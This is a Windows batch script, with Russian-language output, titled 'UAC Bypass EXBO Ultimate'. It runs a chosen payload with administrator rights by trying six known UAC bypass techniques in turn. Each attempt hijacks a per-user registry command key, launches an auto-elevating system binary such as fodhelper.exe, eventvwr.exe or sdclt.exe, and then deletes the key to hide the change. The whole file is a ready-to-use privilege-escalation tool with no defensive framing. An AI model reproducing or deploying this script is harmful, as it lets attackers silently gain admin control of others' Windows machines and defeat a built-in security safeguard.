@echo off
setlocal EnableExtensions EnableDelayedExpansion
chcp 65001 >nul
title [VV.EXE] UAC Bypass EXBO Ultimate
color 0B

set "MARK=%TEMP%\vv_uac_success"

if "%~1"=="" (
    echo.
    echo [VV.EXE] UAC Bypass EXBO Ultimate
    echo.
    echo Использование:
    echo   uac_bypass_all.bat "payload.exe" [аргументы...]
    echo.
    exit /b 1
)

set "PAYLOAD=%~1"
set "ARGS="

:collect_args
shift
if "%~1"=="" goto start_bypass
set ARGS=%ARGS% "%~1"
goto collect_args

:start_bypass
del "%MARK%" >nul 2>&1

echo [*] Запуск перебора UAC bypass методов...
echo [*] Payload: "%PAYLOAD%"
if defined ARGS echo [*] Args: %ARGS%

call :TRY "ms-settings\shell\open\command" "%SystemRoot%\System32\fodhelper.exe"
if %errorLevel% equ 0 goto success

call :TRY "ms-settings\shell\open\command" "%SystemRoot%\System32\computerdefaults.exe"
if %errorLevel% equ 0 goto success

call :TRY "mscfile\shell\open\command" "%SystemRoot%\System32\eventvwr.exe"
if %errorLevel% equ 0 goto success

call :TRY "mscfile\shell\open\command" "%SystemRoot%\System32\CompMgmtLauncher.exe"
if %errorLevel% equ 0 goto success

call :TRY "AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command" "%SystemRoot%\System32\wsreset.exe"
if %errorLevel% equ 0 goto success

call :TRY "exefile\shell\runas\command" "%SystemRoot%\System32\sdclt.exe"
if %errorLevel% equ 0 goto success

echo.
echo [-] Ни один метод не дал повышения.
exit /b 1

:success
echo.
echo [+] UAC bypass успешно отработал.
echo [+] Маркер повышения: %MARK%
exit /b 0

:TRY
set "REGPATH=HKCU\Software\Classes\%~1"
set "BIN=%~2"

if not exist "%BIN%" (
    echo [-] Бинарник не найден: %BIN%
    exit /b 1
)

echo.
echo [>] Пробую: %BIN%
echo [>] Ключ: %REGPATH%

reg add "%REGPATH%" /v DelegateExecute /t REG_SZ /d "" /f >nul 2>&1
reg add "%REGPATH%" /ve /t REG_SZ /d "\"%PAYLOAD%\" %ARGS%" /f >nul 2>&1

start "" "%BIN%" >nul 2>&1

timeout /t 3 /nobreak >nul

reg delete "%REGPATH%" /f >nul 2>&1

if exist "%MARK%" (
    echo [+] Метод сработал.
    exit /b 0
)

echo [-] Метод не сработал.
exit /b 1
